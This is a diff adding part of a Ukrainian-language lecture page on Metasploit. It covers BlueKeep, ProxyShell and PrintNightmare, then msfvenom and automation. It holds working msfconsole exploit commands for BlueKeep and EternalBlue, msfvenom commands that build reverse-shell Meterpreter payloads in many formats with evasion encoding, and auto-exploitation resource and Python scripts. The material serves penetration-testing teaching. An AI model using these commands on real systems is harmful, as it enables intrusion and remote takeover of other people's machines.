+          <tr><td><strong>Протокол</strong></td><td>RDP (Remote Desktop Protocol, порт 3389)</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> Use-after-free вразливість у компоненті RDP — <code>termdd.sys</code>. Атакуючий надсилає спеціально сформовані RDP-пакети до з'єднання Network Level Authentication (NLA). Вразливість є <strong>wormable</strong> — може автоматично поширюватись між вразливими машинами без участі користувача.</p>
+        <pre><code># Перевірка
+msf6 &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; run
+
+# Експлуатація (нестабільна, може спричинити BSOD!)
+msf6 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+msf6 &gt; set RHOSTS 192.168.1.100
+msf6 &gt; set TARGET 2    # Потрібно вибрати правильний target
+msf6 &gt; exploit</code></pre>
+
+        <h3>ProxyShell (Microsoft Exchange)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>9.8 + 9.8 + 7.2</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Ланцюжок: SSRF + Privilege Escalation + RCE</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Microsoft Exchange Server 2013, 2016, 2019 (до KB5003435)</td></tr>
+        </table>
+        <p><strong>Механізм (ланцюжок з 3 CVE):</strong></p>
+        <ol>
+          <li><strong>CVE-2021-34473 (SSRF):</strong> Server-Side Request Forgery дозволяє неавтентифікованому атакуючому обійти ACL і звернутися до внутрішніх ресурсів Exchange</li>
+          <li><strong>CVE-2021-34523 (Privilege Escalation):</strong> через PowerShell Remoting підвищити привілеї до Exchange Admin</li>
+          <li><strong>CVE-2021-31207 (RCE):</strong> довільний запис файлу (web shell) через Export Mailbox</li>
+        </ol>
+
+        <h3>PrintNightmare (CVE-2021-34527)</h3>
+        <table>
+          <tr><th>Параметр</th><th>Деталі</th></tr>
+          <tr><td><strong>CVE</strong></td><td>CVE-2021-34527</td></tr>
+          <tr><td><strong>CVSS</strong></td><td>8.8 (v3.1)</td></tr>
+          <tr><td><strong>Тип</strong></td><td>Remote Code Execution / Local Privilege Escalation</td></tr>
+          <tr><td><strong>Вражені версії</strong></td><td>Усі версії Windows з увімкненим Print Spooler</td></tr>
+          <tr><td><strong>Сервіс</strong></td><td>Windows Print Spooler</td></tr>
+        </table>
+        <p><strong>Механізм:</strong> Вразливість у функції <code>RpcAddPrinterDriverEx()</code> сервісу Print Spooler. Дозволяє автентифікованому (навіть з мінімальними правами) користувачу завантажити шкідливий драйвер принтера, який виконується з привілеями <strong>SYSTEM</strong>. Сервіс Print Spooler увімкнений за замовчуванням на ВСІХ Windows-системах, включаючи контролери домену.</p>
+
+        <h3>Зведена таблиця класичних експлойтів</h3>
+        <table>
+          <tr>
+            <th>Назва</th>
+            <th>CVE</th>
+            <th>CVSS</th>
+            <th>Рік</th>
+            <th>Протокол</th>
+            <th>Тип</th>
+            <th>Вплив</th>
+          </tr>
+          <tr>
+            <td><strong>EternalBlue</strong></td>
+            <td>CVE-2017-0144</td>
+            <td>9.8</td>
+            <td>2017</td>
+            <td>SMBv1</td>
+            <td>Buffer Overflow</td>
+            <td>WannaCry, NotPetya ($14B+)</td>
+          </tr>
+          <tr>
+            <td><strong>vsftpd Backdoor</strong></td>
+            <td>CVE-2011-2523</td>
+            <td>9.8</td>
+            <td>2011</td>
+            <td>FTP</td>
+            <td>Supply Chain</td>
+            <td>Root shell, CTF classic</td>
+          </tr>
+          <tr>
+            <td><strong>Samba trans2open</strong></td>
+            <td>CVE-2003-0201</td>
+            <td>10.0</td>
+            <td>2003</td>
+            <td>SMB</td>
+            <td>Stack Overflow</td>
+            <td>Root RCE, worm vector</td>
+          </tr>
+          <tr>
+            <td><strong>Apache Struts</strong></td>
+            <td>CVE-2017-5638</td>
+            <td>10.0</td>
+            <td>2017</td>
+            <td>HTTP</td>
+            <td>OGNL Injection</td>
+            <td>Equifax breach (143M)</td>
+          </tr>
+          <tr>
+            <td><strong>Log4Shell</strong></td>
+            <td>CVE-2021-44228</td>
+            <td>10.0</td>
+            <td>2021</td>
+            <td>Any (logged)</td>
+            <td>JNDI Injection</td>
+            <td>Мільйони Java-додатків</td>
+          </tr>
+          <tr>
+            <td><strong>BlueKeep</strong></td>
+            <td>CVE-2019-0708</td>
+            <td>9.8</td>
+            <td>2019</td>
+            <td>RDP</td>
+            <td>Use-After-Free</td>
+            <td>Wormable, pre-auth</td>
+          </tr>
+          <tr>
+            <td><strong>ProxyShell</strong></td>
+            <td>3 CVEs (2021)</td>
+            <td>9.8</td>
+            <td>2021</td>
+            <td>HTTPS</td>
+            <td>Chain (SSRF+LPE+RCE)</td>
+            <td>Exchange Server compromise</td>
+          </tr>
+          <tr>
+            <td><strong>PrintNightmare</strong></td>
+            <td>CVE-2021-34527</td>
+            <td>8.8</td>
+            <td>2021</td>
+            <td>MS-RPC</td>
+            <td>Driver Loading RCE</td>
+            <td>Усі Windows, вкл. DC</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 5.8 Автоматизація та інтеграція                              -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>5.8 Автоматизація та інтеграція</h2>
+
+        <h3>msfvenom — генератор payload'ів</h3>
+        <p><strong>msfvenom</strong> — це уніфікований інструмент для генерації payload'ів та їх кодування, що замінив старі <code>msfpayload</code> та <code>msfencode</code> (об'єднані у 2015 році). Синтаксис:</p>
+        <pre><code>msfvenom -p &lt;payload&gt; [options] -f &lt;format&gt; -o &lt;output_file&gt;</code></pre>
+
+        <h3>Типові команди msfvenom</h3>
+        <pre><code># Windows EXE (reverse TCP Meterpreter, x64)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f exe -o payload.exe
+
+# Windows EXE (stageless, для нестабільних мереж)
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f exe -o payload_stageless.exe
+
+# Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f elf -o payload.elf
+
+# Android APK
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -o payload.apk
+
+# PHP Web Shell
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f raw -o shell.php
+
+# Python payload
+msfvenom -p python/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f raw -o payload.py
+
+# PowerShell payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f psh -o payload.ps1
+
+# Java WAR (для Tomcat)
+msfvenom -p java/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f war -o payload.war
+
+# MSI installer
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f msi -o payload.msi
+
+# DLL (для DLL hijacking)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f dll -o payload.dll</code></pre>
+
+        <h3>Кодування (Encoding)</h3>
+        <pre><code># Кодування shikata_ga_nai (поліморфний XOR)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o encoded_payload.exe
+
+# Виключення bad characters (null byte, newline, CR)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -b '\x00\x0a\x0d' \
+  -f exe -o clean_payload.exe
+
+# Список доступних encoder'ів
+msfvenom --list encoders
+
+# Список payload'ів
+msfvenom --list payloads</code></pre>
+
+        <h3>Формати виводу</h3>
+        <table>
+          <tr>
+            <th>Категорія</th>
+            <th>Формат</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td rowspan="7"><strong>Виконувані (Executable)</strong></td>
+            <td><code>exe</code></td>
+            <td>Windows PE (.exe)</td>
+          </tr>
+          <tr>
+            <td><code>elf</code></td>
+            <td>Linux ELF</td>
+          </tr>
+          <tr>
+            <td><code>apk</code></td>
+            <td>Android Application Package</td>
+          </tr>
+          <tr>
+            <td><code>war</code></td>
+            <td>Java Web Archive (Tomcat)</td>
+          </tr>
+          <tr>
+            <td><code>msi</code></td>
+            <td>Windows Installer</td>
+          </tr>
+          <tr>
+            <td><code>dll</code></td>
+            <td>Windows Dynamic Link Library</td>
+          </tr>
+          <tr>
+            <td><code>macho</code></td>
+            <td>macOS Mach-O</td>
+          </tr>
+          <tr>
+            <td rowspan="7"><strong>Трансформовані (Transform)</strong></td>
+            <td><code>c</code></td>
+            <td>C масив байтів</td>
+          </tr>
+          <tr>
+            <td><code>python</code></td>
+            <td>Python-скрипт</td>
+          </tr>
+          <tr>
+            <td><code>powershell</code> / <code>psh</code></td>
+            <td>PowerShell-скрипт</td>
+          </tr>
+          <tr>
+            <td><code>raw</code></td>
+            <td>Сирий шелл-код (без обгортки)</td>
+          </tr>
+          <tr>
+            <td><code>hex</code></td>
+            <td>Hex-кодований рядок</td>
+          </tr>
+          <tr>
+            <td><code>bash</code></td>
+            <td>Bash-скрипт</td>
+          </tr>
+          <tr>
+            <td><code>vbscript</code></td>
+            <td>VBScript</td>
+          </tr>
+        </table>
+
+        <h3>Resource Scripts (.rc файли)</h3>
+        <p>Resource scripts — це текстові файли з командами msfconsole, що дозволяють автоматизувати повторювані задачі. Підтримують <strong>ERB-шаблони</strong> (Embedded Ruby) для динамічного вмісту:</p>
+
+        <pre><code># Файл: eternalblue_auto.rc
+# Автоматична експлуатація EternalBlue
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LPORT 4444
+exploit -j</code></pre>
+
+        <pre><code># Файл: listener.rc
+# Універсальний reverse handler
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z</code></pre>
+
+        <pre><code># ERB-шаблон: scan_and_exploit.rc
+# Ruby-код всередині resource script
+
+&lt;ruby&gt;
+framework.db.hosts.each do |host|
+  run_single("use auxiliary/scanner/smb/smb_ms17_010")
+  run_single("set RHOSTS #{host.address}")
+  run_single("run")
+end
+&lt;/ruby&gt;</code></pre>
+
+        <pre><code># Запуск resource scripts
+msfconsole -r eternalblue_auto.rc        # При старті
+msf6 &gt; resource listener.rc              # Під час роботи
+msf6 &gt; makerc /tmp/session.rc            # Зберегти історію команд як RC</code></pre>
+
+        <h3>Інтеграція з Nmap</h3>
+        <pre><code># Прямий запуск Nmap із збереженням у БД
+msf6 &gt; db_nmap -sV -sC -O -p- -T4 192.168.1.0/24
+
+# Імпорт результатів Nmap XML
+msf6 &gt; db_import /root/nmap_scan.xml
+
+# Пошук сервісів і автоматичне призначення цілей
+msf6 &gt; services -p 445 -R
+# Прапорець -R автоматично встановлює RHOSTS для наступного модуля
+
+# Приклад повного pipeline
+msf6 &gt; db_nmap -sV -p 445 192.168.1.0/24
+msf6 &gt; services -p 445 -R
+msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010
+msf6 &gt; run
+msf6 &gt; vulns    # Переглянути знайдені вразливості</code></pre>
+
+        <h3>Інтеграція з іншими інструментами</h3>
+        <table>
+          <tr>
+            <th>Інструмент</th>
+            <th>Тип</th>
+            <th>Інтеграція з Metasploit</th>
+          </tr>
+          <tr>
+            <td><strong>Cobalt Strike</strong></td>
+            <td>C2 Framework</td>
+            <td>Socks proxy через Meterpreter, session passing, Beacon через MSF listener</td>
+          </tr>
+          <tr>
+            <td><strong>Empire / Starkiller</strong></td>
+            <td>PowerShell C2</td>
+            <td>Foreign listener для передачі сесій між MSF та Empire</td>
+          </tr>
+          <tr>
+            <td><strong>Covenant</strong></td>
+            <td>.NET C2</td>
+            <td>Grunt launcher через msfvenom, session upgrade</td>
+          </tr>
+          <tr>
+            <td><strong>Veil</strong></td>
+            <td>AV Evasion</td>
+            <td>Генерація payload'ів, сумісних з MSF handler</td>
+          </tr>
+          <tr>
+            <td><strong>Nessus / OpenVAS</strong></td>
+            <td>Vulnerability Scanner</td>
+            <td><code>db_import</code> результатів, автоматичний mapping CVE до MSF-модулів</td>
+          </tr>
+          <tr>
+            <td><strong>Nmap</strong></td>
+            <td>Port Scanner</td>
+            <td><code>db_nmap</code>, <code>db_import</code>, <code>services -R</code></td>
+          </tr>
+          <tr>
+            <td><strong>Burp Suite</strong></td>
+            <td>Web Proxy</td>
+            <td>Передача веб-вразливостей для експлуатації через MSF web-модулі</td>
+          </tr>
+        </table>
+
+        <h3>Metasploit API</h3>
+        <ul>
+          <li><strong>RPC API (MessagePack):</strong> основний API для автоматизації. Порт 55553. Використовує MessagePack для серіалізації. Підтримка: Ruby, Python (pymetasploit3), Java</li>
+          <li><strong>REST API (Pro):</strong> RESTful JSON API — тільки у Metasploit Pro. Дозволяє керувати усіма функціями через HTTP-запити</li>
+          <li><strong>Ruby API:</strong> прямий доступ до MSF Core через Ruby-скрипти — найпотужніший та найгнучкіший варіант</li>
+        </ul>
+        <pre><code># Приклад Python-автоматизації через pymetasploit3
+from pymetasploit3.msfrpc import MsfRpcClient
+
+client = MsfRpcClient('password', port=55553)
+exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+exploit['RHOSTS'] = '192.168.1.100'
+exploit['LHOST'] = '192.168.1.50'
+payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+exploit.execute(payload=payload)
+
+# Перегляд сесій
+print(client.sessions.list)</code></pre>
+
+        <h3>Оновлення 2024-2025</h3>
+        <p>Rapid7 продовжує активний розвиток Metasploit Framework. Ключові оновлення:</p>
+        <ul>
+          <li><strong>139 нових модулів</strong> додано за 2024 рік</li>
+          <li><strong>ARM64 Meterpreter</strong> — нативна підтримка Apple Silicon (M1/M2/M3) та ARM-серверів</li>
+          <li><strong>SMB-to-LDAP relay</strong> — новий вектор для Active Directory-атак</li>
+          <li><strong>Indirect syscalls</strong> — обхід EDR через прямі системні виклики замість API</li>
+          <li><strong>Нові типи сесій</strong> — покращена підтримка SSH, SMB та WinRM сесій</li>
+          <li><strong>Encrypted C2 (MSF 6.0+)</strong> — всі Meterpreter-сесії використовують AES-256 шифрування</li>
+          <li><strong>HTTP/2 та HTTPS stager</strong> — маскування трафіку під легітимний веб-трафік</li>
+          <li><strong>Terraform та хмарні модулі</strong> — модулі для AWS, Azure, GCP post-exploitation</li>
+        </ul>
       </section>
 
     </article>
 
     <div class="lecture-nav-bottom">
-      <a href="../lectures/4.html" class="nav-btn">&larr; Попередня</a>
-      <a href="../lectures/6.html" class="nav-btn">Наступна &rarr;</a>
+      <a href="4.html" class="nav-btn">&larr; Попередня</a>
+      <a href="6.html" class="nav-btn">Наступна &rarr;</a>
     </div>
 
     <footer id="site-footer"></footer>
